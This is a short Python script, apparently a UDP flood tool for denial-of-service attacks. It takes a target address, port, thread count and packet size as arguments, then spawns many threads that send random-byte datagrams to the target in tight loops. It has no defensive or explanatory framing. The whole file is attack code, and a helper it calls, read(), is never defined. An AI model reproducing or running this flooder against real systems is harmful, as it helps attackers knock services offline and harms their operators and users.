import socket,threading,sys,os

def UDP_ATTACK(s,size,addr):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        bytes_loader = os.urandom(size)
        bytes_loader2 = bytearray(os.urandom(size))
        for _ in range(2500):
         if read() == True:break
         [s.sendto(bytes_loader,(addr)) for _ in range(5)]
         [s.sendto(bytes_loader2,(addr)) for _ in range(5)]
    except:
       pass

def SOC(addr,size):
  try:
     for _ in range(250):
      if read() == True:break
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
  except:pass

ip,port,thread,size = sys.argv[1], int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
[threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
